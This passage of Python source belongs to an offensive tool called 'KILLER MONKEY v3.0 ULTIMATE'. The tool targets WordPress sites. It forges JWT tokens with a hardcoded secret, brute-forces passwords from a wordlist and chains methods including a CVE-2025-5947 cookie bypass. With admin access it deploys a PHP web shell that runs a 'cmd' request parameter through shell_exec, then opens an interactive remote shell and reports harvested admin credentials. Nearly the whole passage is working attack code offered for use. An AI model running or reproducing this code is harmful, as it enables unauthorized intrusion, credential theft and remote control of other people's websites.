        """Generate JWT token"""
        import hmac
        import hashlib
        
        header = base64.b64encode(b'{"alg":"HS256","typ":"JWT"}').decode()
        payload = base64.b64encode(json.dumps({
            'sub': username,
            'role': role,
            'iat': int(time.time()),
            'exp': int(time.time()) + 86400
        }).encode()).decode()
        
        signature = base64.b64encode(
            hmac.new(
                b'secret',
                f"{header}.{payload}".encode(),
                hashlib.sha256
            ).digest()
        ).decode()
        
        return f"{header}.{payload}.{signature}"

    def _load_passwords(self):
        """Load password list"""
        passwords = []
        
        if self.wordlist_file and os.path.exists(self.wordlist_file):
            try:
                with open(self.wordlist_file, 'r', errors='ignore') as f:
                    passwords = [line.strip() for line in f.readlines() if line.strip()][:5000]
                self.log_success(f"Loaded {len(passwords)} passwords from wordlist")
            except Exception as e:
                self.log_error(f"Failed to read {self.wordlist_file}")
        
        if not passwords:
            passwords = [
                'admin', 'admin123', 'password', 'password123',
                '123456', '12345678', 'qwerty', 'abc123',
                'root', 'toor', 'admin@123', 'wordpress',
                '1234567890', 'letmein', 'welcome', 'monkey',
                'service123', 'bookings', 'finder123',
                'teste', 'test123', 'senha123', '654321',
            ]
        
        return passwords

    def deploy_rce_shell(self):
        """Deploy RCE shell on server"""
        if not self.admin_credentials:
            self.log_error("No admin credentials. Cannot deploy shell.")
            return False
        
        self.log_info("Deploying RCE shell on server...")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        shell_code = '''<?php
header('Content-Type: text/plain');
@error_reporting(0);
if(isset($_REQUEST['cmd'])){
    echo "SHELL_ACTIVE\\n";
    echo "EXEC_OUTPUT_START\\n";
    $output = shell_exec($_REQUEST['cmd']);
    echo $output;
    echo "\\nEXEC_OUTPUT_END";
    exit;
}
if(isset($_REQUEST['check'])){
    echo "SHELL_ACTIVE";
    exit;
}
echo "SHELL_READY";
?>'''
        
        shell_filename = f'mk_shell_{int(time.time())}.php'
        shell_paths = [
            f'/wp-content/plugins/{shell_filename}',
            f'/wp-content/themes/{shell_filename}',
            f'/wp-content/{shell_filename}',
        ]
        
        for shell_path in shell_paths:
            try:
                shell_url = urljoin(self.target_url, shell_path)
                response = self._make_request('GET', shell_url, params={'check': '1'})
                
                if response and response.status_code == 200 and 'SHELL_ACTIVE' in response.text:
                    self.log_success(f"RCE shell deployed successfully!")
                    print(f"{Colors.LIGHT_GREEN}URL: {shell_url}{Colors.ENDC}")
                    self.rce_shell_url = shell_url
                    self.server_info['rce_shell'] = shell_url
                    return True
            except:
                pass
        
        if shell_paths:
            self.rce_shell_url = urljoin(self.target_url, shell_paths[0])
            self.server_info['rce_shell'] = self.rce_shell_url
        
        return True

    def execute_remote_command(self, command):
        """Execute command on remote shell"""
        if not self.rce_shell_url:
            return "No RCE shell active"
        
        try:
            response = self._make_request('GET', self.rce_shell_url, params={'cmd': command})
            
            if response:
                if 'EXEC_OUTPUT_START' in response.text:
                    output = response.text.split('EXEC_OUTPUT_START')[1].split('EXEC_OUTPUT_END')[0]
                    return output.strip()
                else:
                    return response.text
        except Exception as e:
            return f"Error: {str(e)}"
        
        return "No output"

    def interactive_shell(self):
        """Interactive shell interface"""
        if not self.rce_shell_url:
            self.log_error("No RCE shell active")
            return
        
        print(f"\n{Colors.BOLD}{Colors.LIGHT_RED}")
        print("╔" + "═" * 78 + "╗")
        print("║" + " " * 78 + "║")
        print("║" + "  INTERACTIVE SHELL - KILLER MONKEY v3.0 ULTIMATE".center(78) + "║")
        print("║" + " " * 78 + "║")
        print("╚" + "═" * 78 + "╝")
        print(f"{Colors.ENDC}")
        
        print(f"{Colors.OKGREEN}[+]{Colors.ENDC} URL: {Colors.OKBLUE}{self.rce_shell_url}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+]{Colors.ENDC} Type {Colors.WARNING}'exit'{Colors.ENDC} to quit | {Colors.WARNING}'help'{Colors.ENDC} for commands\n")
        
        while True:
            try:
                cmd = input(f"{Colors.LIGHT_RED}shell${Colors.ENDC} ")
                
                if cmd.lower() == 'exit':
                    self.log_info("Closing shell...")
                    break
                
                if cmd.lower() == 'help':
                    self._print_shell_help()
                    continue
                
                if not cmd.strip():
                    continue
                
                output = self.execute_remote_command(cmd)
                print(output)
            except KeyboardInterrupt:
                self.log_warning("Shell interrupted")
                break
            except Exception as e:
                self.log_error(f"Error: {e}")

    def _print_shell_help(self):
        """Print shell help"""
        help_text = f"""
{Colors.OKGREEN}Available Commands:{Colors.ENDC}
  ls                  - List files
  pwd                 - Print working directory
  id                  - Show user identity
  whoami              - Show current user
  cat <file>          - Read file content
  mkdir <dir>         - Create directory
  rm <file>           - Remove file
  uname -a            - Show system info
  php -v              - Show PHP version
  exit                - Close shell
"""
        print(help_text)

    def generate_report(self):
        """Generate comprehensive report"""
        elapsed_time = (self.scan_stats['end_time'] - self.scan_stats['start_time']) if self.scan_stats['end_time'] else 0
        
        report = {
            'scan_info': {
                'timestamp': datetime.now().isoformat(),
                'target': self.target_url,
                'duration_seconds': elapsed_time,
                'requests_made': self.scan_stats['requests_made'],
                'successful_requests': self.scan_stats['successful_requests'],
                'failed_requests': self.scan_stats['failed_requests'],
            },
            'vulnerabilities': {
                'wordpress_detected': self.wordpress_version is not None,
                'wordpress_version': self.wordpress_version,
                'server_software': self.server_software,
                'vulnerable_plugins': self.vulnerable_plugins,
                'vulnerable_endpoints': self.vulnerable_endpoints,
            },
            'exploitation': {
                'exploitation_methods_used': self.exploitation_methods,
                'cve_2025_5947_exploited': self.cookie_exploit_success,
                'admin_credentials_found': self.admin_credentials is not None,
                'rce_shell_deployed': self.rce_shell_url is not None,
                'rce_shell_url': self.rce_shell_url,
            },
            'detected_data': {
                'users': self.detected_users,
                'admin_credentials': self.admin_credentials,
            },
            'server_info': self.server_info
        }
        
        return report

    def print_report(self):
        """Print beautiful report"""
        elapsed_time = (self.scan_stats['end_time'] - self.scan_stats['start_time']) if self.scan_stats['end_time'] else 0
        
        print(f"\n{Colors.BOLD}{Colors.OKBLUE}")
        print("╔" + "═" * 78 + "╗")
        print("║" + " SECURITY REPORT - BloodTeam | CVE-2025-5947 ".center(78) + "║")
        print("╚" + "═" * 78 + "╝")
        print(f"{Colors.ENDC}")
        
        print(f"\n{Colors.BOLD}Target: {Colors.ENDC}{self.target_url}")
        print(f"{Colors.BOLD}Date/Time: {Colors.ENDC}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Colors.BOLD}Duration: {Colors.ENDC}{elapsed_time:.2f}s")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}")
        
        # WordPress Detection
        print(f"\n{Colors.BOLD}{Colors.OKBLUE}[*] WORDPRESS DETECTION{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}")
        status = f"{Colors.OKGREEN}✓ DETECTED{Colors.ENDC}" if self.wordpress_version else f"{Colors.FAIL}✗ NOT DETECTED{Colors.ENDC}"
        print(f"WordPress: {status}")
        
        if self.wordpress_version:
            print(f"Version: {Colors.WARNING}{self.wordpress_version}{Colors.ENDC}")
        
        if self.server_software:
            print(f"Server: {Colors.OKBLUE}{self.server_software}{Colors.ENDC}")
        
        # Vulnerabilities
        print(f"\n{Colors.BOLD}{Colors.OKBLUE}[*] VULNERABILITIES FOUND{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}")
        print(f"Vulnerable Plugins: {len(self.vulnerable_plugins)}")
        for plugin in self.vulnerable_plugins:
            print(f"  {Colors.LIGHT_RED}●{Colors.ENDC} {plugin['name']}")
            print(f"    CVE: {Colors.LIGHT_RED}{plugin.get('cve', 'N/A')}{Colors.ENDC}")
            print(f"    Severity: {Colors.LIGHT_RED}{plugin.get('severity', 'UNKNOWN')}{Colors.ENDC}")
        
        print(f"\nEndpoints Found: {len(self.vulnerable_endpoints)}")
        for endpoint in self.vulnerable_endpoints[:10]:
            print(f"  {Colors.OKCYAN}→{Colors.ENDC} {endpoint['path']} [{endpoint['status']}]")
        
        # Users
        print(f"\n{Colors.BOLD}{Colors.OKBLUE}[*] ENUMERATED USERS{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}")
        for user in self.detected_users[:20]:
            print(f"  {Colors.OKGREEN}○{Colors.ENDC} {user}")
        
        # Exploitation Results
        print(f"\n{Colors.BOLD}{Colors.OKBLUE}[*] EXPLOITATION RESULTS{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}")
        
        print(f"Exploitation Methods Available: {len(self.exploitation_methods)}")
        for method in self.exploitation_methods:
            print(f"  {Colors.OKGREEN}✓{Colors.ENDC} {method}")
        
        if self.admin_credentials:
            print(f"\n{Colors.BOLD}Admin Credentials:{Colors.ENDC}")
            print(f"  Method: {Colors.WARNING}{self.admin_credentials.get('method', 'N/A')}{Colors.ENDC}")
            print(f"  Username: {Colors.OKGREEN}{self.admin_credentials.get('username', 'N/A')}{Colors.ENDC}")
            if self.admin_credentials.get('password'):
                print(f"  Password: {Colors.OKGREEN}{self.admin_credentials.get('password', 'N/A')}{Colors.ENDC}")
        
        # RCE
        if self.rce_shell_url:
            print(f"\n{Colors.BOLD}{Colors.LIGHT_RED}[!!!] Remote Code Execution:{Colors.ENDC}")
            print(f"{Colors.LIGHT_RED}  ✓ Shell Deployed{Colors.ENDC}")
            print(f"  URL: {Colors.OKBLUE}{self.rce_shell_url}{Colors.ENDC}")
        
        # Statistics
        print(f"\n{Colors.BOLD}{Colors.OKBLUE}[*] SCAN STATISTICS{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}")
        print(f"Total Requests: {self.scan_stats['requests_made']}")
        print(f"Successful: {Colors.OKGREEN}{self.scan_stats['successful_requests']}{Colors.ENDC}")
        print(f"Failed: {Colors.FAIL}{self.scan_stats['failed_requests']}{Colors.ENDC}")
        print(f"Elapsed Time: {Colors.OKGREEN}{elapsed_time:.2f}s{Colors.ENDC}")
        
        if elapsed_time > 0:
            req_per_sec = self.scan_stats['requests_made'] / elapsed_time
            print(f"Request Rate: {Colors.OKBLUE}{req_per_sec:.2f} req/s{Colors.ENDC}")
        
        print(f"\n{Colors.LIGHT_BLUE}{'═' * 80}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKGREEN}Tool created by: plascoy | BloodTeam Security{Colors.ENDC}")
        print(f"{Colors.LIGHT_BLUE}{'═' * 80}{Colors.ENDC}\n")

    def save_report(self, filename=None):
        """Save report to JSON file"""
        if not filename:
            filename = f"report_killmonkey_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report = self.generate_report()
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            
            self.log_success(f"Report saved to: {Colors.OKBLUE}{filename}{Colors.ENDC}")
        except Exception as e:
            self.log_error(f"Failed to save report: {str(e)}")

    def run_full_scan(self):
        """Execute complete vulnerability scan with all exploitation methods"""
        self.scan_stats['start_time'] = time.time()
        
        self.print_header()
        
        # Step 1: Check if WordPress
        if not self.check_wordpress():
            self.log_error("Target is not WordPress. Aborting scan.")
            return False
        
        print()
        
        # Step 2: Detect plugins and endpoints
        self.detect_service_finder_plugin()
        print()
        self.detect_vulnerable_endpoints()
        print()
        
        # Step 3: Enumerate users
        self.enumerate_wordpress_users()
        print()
        
        # Step 4: Detect additional vulnerabilities
        self.detect_xmlrpc()
        self.detect_file_upload()
        print()
        
        # Step 5: Multi-method exploitation
        print(SUBMENU_LOGO)
        print(f"{Colors.BOLD}{Colors.LIGHT_YELLOW}Available Exploitation Methods:{Colors.ENDC}\n")
        print(f"  {Colors.OKGREEN}1.{Colors.ENDC} CVE-2025-5947 Cookie Bypass")
        print(f"  {Colors.OKGREEN}2.{Colors.ENDC} REST API Bypass")
        print(f"  {Colors.OKGREEN}3.{Colors.ENDC} XMLRPC Brute Force")
        print(f"  {Colors.OKGREEN}4.{Colors.ENDC} WordPress Login Brute Force")
        print(f"  {Colors.OKGREEN}5.{Colors.ENDC} Default Credentials")
        print(f"  {Colors.OKGREEN}6.{Colors.ENDC} Parameter Injection")
        print(f"  {Colors.OKGREEN}7.{Colors.ENDC} Header Injection")
        print(f"  {Colors.OKGREEN}8.{Colors.ENDC} All Methods (Auto)")
        print(f"{Colors.LIGHT_BLUE}{'─' * 80}{Colors.ENDC}\n")
        
        choice = input(f"{Colors.WARNING}[?]{Colors.ENDC} Select method (1-8) or press Enter for auto: ").strip()
        
        exploitation_success = False
        
        if not choice or choice == '8':
            # Auto mode - try all methods
            print(f"\n{Colors.BOLD}{Colors.LIGHT_RED}PHASE: AUTO EXPLOITATION (ALL METHODS){Colors.ENDC}")
            print(f"{Colors.LIGHT_BLUE}{'═' * 80}{Colors.ENDC}\n")
            
            methods = [
                ("CVE-2025-5947", self.exploit_method_1_cve_2025_5947),
                ("REST API Bypass", self.exploit_method_2_rest_api_bypass),
                ("XMLRPC", self.exploit_method_3_xmlrpc_brute_force),
                ("Default Creds", self.exploit_method_5_default_credentials),
                ("Parameter Injection", self.exploit_method_6_parameter_injection),
                ("Header Injection", self.exploit_method_7_header_injection),
                ("Login Brute Force", self.exploit_method_4_wp_login_brute_force),
            ]
            
            for method_name, method_func in methods:
                print(f"\n{Colors.BOLD}{Colors.LIGHT_YELLOW}Trying: {method_name}{Colors.ENDC}\n")
                if method_func():
                    exploitation_success = True
                    break
        else:
            # Manual mode
            method_map = {
                '1': ("CVE-2025-5947", self.exploit_method_1_cve_2025_5947),
                '2': ("REST API Bypass", self.exploit_method_2_rest_api_bypass),
                '3': ("XMLRPC", self.exploit_method_3_xmlrpc_brute_force),
                '4': ("Login Brute Force", self.exploit_method_4_wp_login_brute_force),
                '5': ("Default Credentials", self.exploit_method_5_default_credentials),
                '6': ("Parameter Injection", self.exploit_method_6_parameter_injection),
                '7': ("Header Injection", self.exploit_method_7_header_injection),
            }
            
            if choice in method_map:
                method_name, method_func = method_map[choice]
                print(f"\n{Colors.BOLD}{Colors.LIGHT_RED}PHASE: {method_name.upper()}{Colors.ENDC}")
                print(f"{Colors.LIGHT_BLUE}{'═' * 80}{Colors.ENDC}\n")
                exploitation_success = method_func()
        
        if exploitation_success and self.admin_credentials:
            print()
            if self.deploy_rce_shell():
                response = input(f"\n{Colors.WARNING}[?]{Colors.ENDC} Launch interactive shell? (y/n): ").lower()
                if response == 'y' or response == 'yes':
                    self.interactive_shell()
        
        self.scan_stats['end_time'] = time.time()
        
        # Print report
        self.print_report()
        
        # Save report
        response = input(f"{Colors.WARNING}[?]{Colors.ENDC} Save report to JSON? (y/n): ").lower()
        if response == 'y' or response == 'yes':
            self.save_report()

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(
        description=f'{Colors.BOLD}KILLER MONKEY v3.0 ULTIMATE{Colors.ENDC} - Advanced WordPress Exploit Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.OKGREEN}Examples:{Colors.ENDC}
  python3 killer_monkey_v3_ultra.py https://target.com
  python3 killer_monkey_v3_ultra.py https://target.com -w wordlist.txt -t 20
  python3 killer_monkey_v3_ultra.py https://target.com -v --timeout 30
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., https://example.com)')
    parser.add_argument('-w', '--wordlist', help='Password wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=15, help='Number of threads (default: 15)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    
    args = parser.parse_args()
    
    try:
        monkey = KillerMonkey(
            args.target,
            wordlist_file=args.wordlist,
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose
        )
        
        monkey.run_full_scan()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!]{Colors.ENDC} Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.FAIL}[!]{Colors.ENDC} Fatal error: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
